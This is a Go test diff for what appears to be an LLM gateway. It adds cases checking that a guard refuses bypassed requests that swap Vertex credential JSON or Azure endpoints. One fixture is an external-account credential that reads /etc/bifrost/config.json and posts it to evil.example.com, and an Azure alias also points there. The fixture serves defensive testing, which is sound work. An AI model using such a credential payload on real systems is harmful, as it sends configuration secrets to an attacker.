@@ -15,7 +15,7 @@ import (
 
 	"github.com/maximhq/bifrost/core/schemas"
 	"github.com/maximhq/bifrost/framework/configstore"
-	"github.com/maximhq/bifrost/transports/bifrost-http/lib"
+	"github.com/maximhq/bifrost/transports/v2/bifrost-http/lib"
 	"github.com/valyala/fasthttp"
 )
 
@@ -1301,12 +1301,34 @@ func TestProviderKeyEndpointGuard_CoversEveryDialTarget(t *testing.T) {
 		return `{"app_id":"123","installation_id":"456","repository_id":"789","private_key":` + strconv.Quote(copilotPEM) + `,"github_domain":"` + domain + `"}`
 	}
 
+	// A Vertex credential JSON names where the Google client dials: a service account's
+	// token_uri, and for an external account the token_url plus a credential_source the client
+	// reads (here a local file) and posts there. Swapping the JSON therefore moves the key's
+	// destination as surely as moving an Azure endpoint does.
+	const vertexServiceAccountJSON = `{"type":"service_account","project_id":"p","client_email":"sa@p.iam.gserviceaccount.com","private_key":"-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----\n","token_uri":"https://oauth2.googleapis.com/token"}`
+	const vertexExternalAccountJSON = `{"type":"external_account","audience":"//iam.googleapis.com/projects/1/locations/global/workloadIdentityPools/p/providers/x","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","token_url":"https://evil.example.com/token","credential_source":{"file":"/etc/bifrost/config.json"}}`
+	vertexConfig := func(credentials string) string {
+		return `{"project_id":"p","region":"us-central1","auth_credentials":` + strconv.Quote(credentials) + `}`
+	}
+	vertexStored := func() *schemas.Key {
+		return &schemas.Key{
+			ID: "key-1", Name: "vertex-key", Weight: 1,
+			VertexKeyConfig: &schemas.VertexKeyConfig{
+				ProjectID:       *schemas.NewSecretVar("p"),
+				Region:          *schemas.NewSecretVar("us-central1"),
+				AuthCredentials: *schemas.NewSecretVar(vertexServiceAccountJSON),
+			},
+		}
+	}
+
 	cases := []struct {
-		name     string
-		provider schemas.ModelProvider
-		stored   *schemas.Key // nil means the request creates the key
-		body     string
-		want403  bool
+		name        string
+		provider    schemas.ModelProvider
+		stored      *schemas.Key // nil means the request creates the key
+		genuineAuth bool         // the request carries a real credential, not the fail-open bypass
+		body        string
+		want403     bool
+		wantNamed   string // a 403 must name this field
 	}{
 		{
 			name:     "create bedrock key with region only",
@@ -1369,6 +1391,43 @@ func TestProviderKeyEndpointGuard_CoversEveryDialTarget(t *testing.T) {
 			body:    `{"value":"azure-api-key","weight":1,"azure_key_config":{"endpoint":"https://myres.openai.azure.com"},"aliases":{"gpt-4o":{"model_id":"gpt-4o","endpoint":"https://evil.example.com"}}}`,
 			want403: true,
 		},
+		{
+			name:      "create vertex key with a credential json",
+			provider:  schemas.Vertex,
+			body:      `{"name":"vertex-key","weight":1,"vertex_key_config":` + vertexConfig(vertexServiceAccountJSON) + `}`,
+			want403:   true,
+			wantNamed: "vertex_key_config.auth_credentials",
+		},
+		{
+			name:      "update vertex key swapping the credential json for an external account",
+			provider:  schemas.Vertex,
+			stored:    vertexStored(),
+			body:      `{"weight":1,"vertex_key_config":` + vertexConfig(vertexExternalAccountJSON) + `}`,
+			want403:   true,
+			wantNamed: "vertex_key_config.auth_credentials",
+		},
+		{
+			name:     "update vertex key removing the credential json",
+			provider: schemas.Vertex,
+			stored:   vertexStored(),
+			body:     `{"weight":1,"vertex_key_config":{"project_id":"p","region":"us-central1","auth_credentials":""}}`,
+			want403:  true,
+		},
+		{
+			name:     "update vertex key keeping its stored credential json",
+			provider: schemas.Vertex,
+			stored:   vertexStored(),
+			body:     `{"weight":2,"vertex_key_config":` + vertexConfig(vertexServiceAccountJSON) + `}`,
+			want403:  false,
+		},
+		{
+			name:        "genuinely authenticated update vertex key swapping the credential json",
+			provider:    schemas.Vertex,
+			stored:      vertexStored(),
+			genuineAuth: true,
+			body:        `{"weight":1,"vertex_key_config":` + vertexConfig(vertexExternalAccountJSON) + `}`,
+			want403:     false,
+		},
 	}
 
 	for _, tc := range cases {
@@ -1385,7 +1444,9 @@ func TestProviderKeyEndpointGuard_CoversEveryDialTarget(t *testing.T) {
 
 			ctx := newTestRequestCtx(tc.body)
 			ctx.SetUserValue("provider", string(tc.provider))
-			ctx.SetUserValue(schemas.BifrostContextKeyAuthBypassed, true)
+			if !tc.genuineAuth {
+				ctx.SetUserValue(schemas.BifrostContextKeyAuthBypassed, true)
+			}
 			if tc.stored != nil {
 				ctx.SetUserValue("key_id", tc.stored.ID)
 				h.updateProviderKey(ctx)
@@ -1396,6 +1457,9 @@ func TestProviderKeyEndpointGuard_CoversEveryDialTarget(t *testing.T) {
 			got403 := ctx.Response.StatusCode() == fasthttp.StatusForbidden
 			if got403 != tc.want403 {
 				t.Fatalf("got status %d, want403=%v; body=%s", ctx.Response.StatusCode(), tc.want403, ctx.Response.Body())
+			}
+			if tc.wantNamed != "" && !strings.Contains(string(ctx.Response.Body()), tc.wantNamed) {
+				t.Fatalf("the refusal must name %s, got %s", tc.wantNamed, ctx.Response.Body())
 			}
 			keys := h.inMemoryStore.Providers[tc.provider].Keys
 			switch {
